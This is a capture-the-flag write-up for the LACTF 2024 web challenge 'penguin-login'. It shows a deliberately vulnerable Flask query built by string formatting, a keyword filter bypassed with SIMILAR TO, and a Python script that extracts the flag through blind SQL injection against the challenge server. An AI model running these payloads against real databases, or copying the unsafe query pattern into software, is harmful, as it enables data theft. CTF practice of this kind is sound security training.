---
title: penguin-login
date: 2024-02-19 08:05
tags: 
- web
- sqli
- author-hartmannsyg
categories: LACTF 2024
---

solved by {% person hartmannsyg %}

{% ccb lang:py gutter1:47-71 caption:app.py highlight:13 %}
@app.post("/submit")
def submit_form():
    try:
        username = request.form["username"]
        conn = get_database_connection()

        assert all(c in allowed_chars for c in username), "no character for u uwu"
        assert all(
            forbidden not in username.lower() for forbidden in forbidden_strs
        ), "no word for u uwu"

        with conn.cursor() as curr:
            curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
            result = curr.fetchall()

        if len(result):
            return "We found a penguin!!!!!", 200
        return "No penguins sadg", 201

    except Exception as e:
        return f"Error: {str(e)}", 400

    # need to commit to avoid connection going bad in case of error
    finally:
        conn.commit()
{% endccb %}

Somehow, SQL injection works on this: `' or '1` returns us "We found a penguin!!!!!"
```sql
SELECT * FROM penguins WHERE name = '' or '1'
```

We have `like` as a forbidden word but we can get around that by using `SIMILAR TO` instead:

{% ccb gutter1:12,13 lang:py caption:app.py %}
allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")
forbidden_strs = ["like"]
{% endccb %}

So we first exfiltrate the length with `_` which represents one character. We keep sending increasingly long chains of underscores until one matches:

```py
import requests
for i in range(100):
    res = requests.post("https://penguin.chall.lac.tf/submit",{"username":"'or name SIMILAR TO '"+"_"*i})
    print(str(i)+") "+res.text)
```

{% ccb terminal:true %}
0) No penguins sadg
1) No penguins sadg
2) No penguins sadg
3) No penguins sadg
4) We found a penguin!!!!! (peng)
5) No penguins sadg
6) No penguins sadg
7) We found a penguin!!!!! (emperor)
8) No penguins sadg
9) No penguins sadg
10) No penguins sadg
...
45) We found a penguin!!!!!
{% endccb %}

So our flag is 45 chars long.

We then have our solve script:

{% ccb gutter1:1-15 lang:py caption:solve.py %}
import requests
import string
alphabet = string.ascii_letters + string.digits + '{}_'
known = ''
for i in range(45):
    for c in alphabet:
        data = {"username":"'or name SIMILAR TO '" + known.replace('{','_') + c + "_"*(44-i)}
        # print(data["username"])
        res = requests.post("https://penguin.chall.lac.tf/submit",data)
        # print(res.text)
        if '!!!' in res.text:
            known += c
            print(known + '!'*50)
            break
print(known)
{% endccb %}

`{` is a character used in regex, and it just so happens that the character after that is a number, so to prevent throwing a error we replace it with `_` when it is known (this is done in the known.replace() function in the solve script)

`lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}`